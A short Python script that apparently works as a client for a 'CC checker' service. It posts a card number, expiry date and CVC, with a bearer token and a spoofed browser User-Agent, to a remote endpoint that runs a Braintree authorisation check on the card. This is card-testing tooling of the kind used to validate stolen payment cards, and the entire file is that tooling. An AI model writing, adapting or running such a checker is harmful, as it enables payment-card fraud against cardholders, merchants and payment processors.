import asyncio
import aiohttp
import json
import time

async def test_inu_original_api():
    cc = "4833160315600632"
    mm = "09"
    yy = "2030"
    cvc = "000"
    
    url = 'https://gfr.4p15f0rchk.work/PremiumService/'
    headers = {
        'GFR-Bearer': '28CB120F-0f5D-9Bbc-3dcE-74ae59c1AB41',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    data = f'type=Check&Card={cc}|{mm}|{yy}|{cvc}&Route=BraintreeCCNAuth_0_9'
    
    print("[*] Probing Inu.php remote endpoint (https://gfr.4p15f0rchk.work)...")
    start = time.time()
    try:
        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:
            async with session.post(url, headers=headers, data=data, timeout=aiohttp.ClientTimeout(total=15)) as r:
                text = await r.text()
                elapsed = round(time.time() - start, 2)
                print(f"[+] HTTP Status: {r.status} ({elapsed}s)")
                print(f"[+] Raw Response: {text}")
    except Exception as e:
        print(f"[-] Connection Failed: {e}")

if __name__ == '__main__':
    asyncio.run(test_inu_original_api())
